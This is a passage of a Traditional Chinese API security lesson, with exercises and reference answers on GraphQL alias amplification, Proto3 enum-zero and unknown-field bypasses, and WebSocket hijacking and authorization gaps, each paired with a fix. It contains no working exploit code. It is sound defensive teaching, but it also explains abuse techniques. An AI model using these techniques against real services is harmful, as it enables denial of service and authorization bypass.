1. **為什麼鎖了深度跟 Batch 還是被打爆**：某 GraphQL 閘道已設好「最大深度 `8` 層」與「單次 HTTP Batch 上限 `20` 個操作」，卻被一筆深度僅 `6` 層（含 5 層關聯列表，每層 `limit: 4`）、內含 `20` 個 Alias 的單一 HTTP 請求打到逾時。請算出這筆請求在第 5 層與整棵樹各展開多少結果項與列表求值次數？從架構上根治該上哪兩道防線？
2. **診斷 Proto3 的兩個二進位陷阱**：某內部帳務 gRPC 的 `.proto` 寫了 `enum ApprovalStatus { APPROVED = 0; PENDING = 1; REJECTED = 2; }`，且前方的邊緣代理用的是舊版 `.proto`（只定義欄位 `1`–`4`），後方的核心服務已升到新版 `.proto`（多了欄位 `5: int64 override_limit`）。這兩個設計合在一起會讓攻擊者抓到哪兩種繞過檢查的機會？該怎麼修？
3. **為什麼 WebSocket 掛在登入路由後面還是不安全**：某工程師拍胸脯保證：「我們的 WebSocket 握手路由 `/ws/live-orders` 已經掛在 Express 的 `sessionAuthMiddleware` 後面了，沒登入根本連不上來，所以絕對不會有資安問題！」請問這句話漏掉了哪兩個 WebSocket 專屬的致命破口？各自該怎麼補？

---

### 參考解答

1. **為什麼鎖了深度跟 Batch 還是被打爆**：
   - **盲點與算式**：深度只管樹高，不管分支度；Batch 只管頂層 JSON 陣列元素數，不管單一查詢內的 Alias 數。每層回傳 `4` 筆時，單一 Alias 在第 5 層會展開 $4^5 = 1,024$ 個結果項（全樹 5 層共 $1,364$ 個結果項，觸發 $1 + 4 + 16 + 64 + 256 = 341$ 次列表 Resolver 求值）；乘上 `20` 個 Alias，單筆請求就會炸出 **`20,480` 個第 5 層結果項**（**全樹 `27,280` 個結果項**）與 **`5,120` 次第 5 層列表求值**（**全樹 `6,820` 次列表求值**）。
   - **兩道根治防線**：第一是導入**執行前靜態查詢成本分析（Query Cost Analysis）**，在執行 Resolver 前先把分支乘數（`limit`）與所有 Alias 的權重加總，超標直接拒收；第二是在正式環境改用**靜態查詢白名單（Persisted Queries / Trusted Documents）**，只准執行前端建置時預先登記過的 `queryId`。
2. **診斷 Proto3 的兩個二進位陷阱**：
   - **陷阱一（預設零值等於核准）**：在預設採隱式存在性（未標註 `optional`）的 Proto3 純量欄位裡，數值 `0` 是預設零值，在網路上會省略不傳；一旦把 `APPROVED = 0` 放在第一個，只要客戶端刻意不傳這個欄位，伺服器解碼讀出來的值就會自動變成 `ApprovalStatus.APPROVED`（直接核准）！
   - **陷阱二（未知欄位穿透舊版代理）**：支援保留未知欄位的 Protobuf 解碼器在遇到不認識的欄位編號時，預設會把它留在訊息結構裡，並在重新序列化轉發時原封不動帶出去。攻擊者只要在封包裡偷塞新版核心服務才認識的欄位 `5: override_limit`，舊版代理檢查完欄位 `1`–`4` 覺得沒問題，重新序列化轉發時就會把欄位 `5` 一路護送進核心服務。
   - **修法**：把所有 Enum 的 `0` 一律保留給 `APPROVAL_STATUS_UNSPECIFIED` 並在程式裡拒收、對關鍵欄位加上 `optional` 明確檢查有沒有傳值，並在邊界代理上設定丟棄未知欄位（或重新建立乾淨的訊息物件再轉發）。
3. **為什麼 WebSocket 掛在登入路由後面還是不安全**：
   - **破口一（跨站 WebSocket 劫持 CSWSH）**：當 Session Cookie 符合跨站或同站子網域傳送資格時，受害者瀏覽器在惡意網頁發起 `new WebSocket(...)` 會自動附上 Cookie，且 CORS 不擋 `101 Switching Protocols` 握手。**修法**：握手時嚴格比對 `Origin` 白名單，並改用由 REST API 核發、存於 Redis 的**短效單次消費 Ticket** 做握手認證，不再單憑 Cookie 放行。
   - **破口二（握手後的訊息層 BOLA 與長連線權限僵化）**：完成 Upgrade 後的訊框不再經過 Express HTTP Middleware，未重驗 `tenantId` 會導致跨租戶頻道偷聽；且若只在握手時驗一次，後續 JWT（`900 s`）過期或帳號停權也不會中斷既有長連線。**修法**：對**每一幀業務與訂閱訊框重新核對當前租戶權限**，並結合伺服器端期限重驗與 Redis Pub/Sub 撤銷廣播，主動送出 Close Frame 切斷失效連線。

---

## 延伸閱讀

- **GraphQL 官方與 OWASP 安全指南**：OWASP *GraphQL Cheat Sheet*，詳細整理了關閉 Introspection / Field Suggestion、限制 Query Complexity 與實作 Resolver 層授權的完整檢核表。
- **gRPC 與 Protobuf 底層編碼規範**：Google 官方的 *Protocol Buffers Encoding Guide*（把 Varint、ZigZag 與 Unknown Fields 的二進位線路格式講得非常透徹）以及 *gRPC Authentication & Interceptor* 開發指南。
- **WebSocket 協定標準**：RFC 6455（*The WebSocket Protocol*），特別建議細讀第 4 節 Opening Handshake 與第 10 節 Security Considerations 裡針對 `Origin` 驗證的設計要求。
- **線上實戰靶場**：PortSwigger Web Security Academy — *GraphQL API vulnerabilities* 與 *WebSockets* 全系列互動實驗。
